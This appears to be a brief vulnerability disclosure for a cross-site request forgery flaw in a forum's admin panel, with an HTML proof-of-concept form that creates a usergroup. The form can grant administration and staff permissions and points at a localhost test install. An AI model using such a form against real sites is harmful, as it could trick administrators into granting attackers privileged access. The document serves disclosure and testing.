# New Usergroup CSRF
Allows to create new usergroups through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form action="http://localhost/admin/new_usergroup.php" method="POST" style="padding: 25px;">
    <label for="g_name">Name</label>
    <input type="text" name="g_name" id="g_name" class="form-control">
    <label for="g_style">Style <small><code>%username%</code> will be replaced with the user's username.</small></label>
    <textarea name="g_style" id="g_style" class="form-control">&lt;span&gt;%username%&lt;/span&gt;</textarea>
    <label for="permissions">Permissions</label><br>
    <input type="checkbox" name="permissions[]" value="1"> view_forum<br><input type="checkbox" name="permissions[]" value="2"> create_thread<br><input type="checkbox" name="permissions[]" value="3"> reply_thread<br><input type="checkbox" name="permissions[]" value="4"> access_moderation<br><input type="checkbox" name="permissions[]" value="5"> access_administration<br>
    <br>
    <input type="checkbox" name="is_staff" value="1"> This Usergroup is staff.
    <br>
    <input type="submit" name="new" value="Create Usergroup" class="btn btn-default">
</form>
```
